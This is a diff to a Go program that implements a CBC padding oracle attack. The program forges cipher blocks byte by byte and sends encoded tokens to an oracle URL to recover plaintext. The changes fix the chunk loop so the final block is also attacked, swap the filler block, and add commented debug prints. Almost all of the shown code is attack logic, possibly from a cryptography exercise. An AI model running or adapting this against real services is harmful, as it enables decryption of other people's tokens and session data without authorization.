@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"strings"
 )
 
 type callOracle func(u, token string) (bool, error)
@@ -14,7 +13,7 @@ type encodeToken func(buffer []byte) string
 func PaddingOracle(chunks [][]byte, urlBase string, callOracle callOracle, encode encodeToken) []byte {
 	plaintext := make([]byte, 0)
 	// Loop through every chunk beginning with the last
-	for i := 1; i < len(chunks)-1; i++ {
+	for i := 1; i < len(chunks); i++ {
 		fmt.Printf("\n\n** Starting Chunk %d of %d **\n\n", i, len(chunks)-1)
 		plainBlock := make([]byte, 0)
 		curr, prev := setAttackBlock(chunks, i)
@@ -79,6 +78,7 @@ func subAttackBytes(interm, chr, padByte byte) byte {
 	if interm != 0 {
 		// force intermediate value to desired current padByte
 		tmp = interm ^ padByte
+		// fmt.Printf("Sub attack byte %v (%v XOR %v)\n", tmp, interm, padByte)
 	} else {
 		tmp = chr
 	}
@@ -87,13 +87,15 @@ func subAttackBytes(interm, chr, padByte byte) byte {
 
 func makeToken(curr, interm []byte, chunkPos int, chr, padByte byte, encode encodeToken) string {
 	// create C1' block of random characters
-	tmp := []byte(strings.Repeat("a", len(curr)))
+	// tmp := []byte(strings.Repeat("a", len(curr)))
+	tmp := make([]byte, len(curr))
 	for attackPos := len(curr) - 1; attackPos >= chunkPos; attackPos-- {
 		tmp[attackPos] = subAttackBytes(interm[attackPos], chr, padByte)
 	}
-	// fmt.Printf("[-] Attempt attack with: %v\n", tmp)
+	// fmt.Printf("[-] Test Bytes: %v\n", tmp)
 	test := append(tmp, curr...)
 	// fmt.Printf("Test: %v\n", test)
 	token := encode(test)
+	// fmt.Println(token)
 	return token
 }
